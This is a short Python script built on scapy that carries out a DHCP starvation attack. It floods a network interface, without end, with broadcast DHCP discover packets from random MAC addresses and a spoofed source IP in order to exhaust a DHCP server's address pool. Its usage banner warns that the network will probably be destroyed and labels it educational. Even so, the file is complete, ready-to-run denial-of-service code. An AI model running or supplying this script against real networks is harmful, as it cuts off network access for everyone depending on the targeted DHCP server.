import scapy.all as sc
import optparse as opt

parser = opt.OptionParser("""
*** RECOMMENDED: 'python3' ***

usage1: sudo python3 DHCPsarvation.py -i <your_interface>
usage2: sudo python3 DHCPsarvation.py --interface <your_interface>

[*] Your IP address default: '1.2.3.4'
[*] For Quit: CTRL + C

WARNING: Probably your network will be
destroyed while running this script.
That's why this script only for the education.
""")

parser.add_option("-i", "--interface", dest="interface", help=parser.usage)

(options, args) = parser.parse_args()

interface = options.interface

#You can change the IP(src="....") 		: line 23
def main():
	sc.conf.checkIPaddr = False

	dhcpDiscover = sc.Ether(dst="ff:ff:ff:ff:ff:ff", src=sc.RandMAC()) \
					/sc.IP(src="1.2.3.4", dst="255.255.255.255") \
					/sc.UDP(sport=68, dport=67) \
					/sc.BOOTP(chaddr=sc.RandMAC()) \
					/sc.DHCP(options=[('message-type', 'discover'), ('end')])

	sc.sendp(dhcpDiscover, iface=interface, loop=1, verbose=1)

if __name__ == "__main__":
	if options.interface == None:
		print(parser.usage)
		exit()
	else:
		try:
			main()
		except PermissionError:
			print(parser.usage)
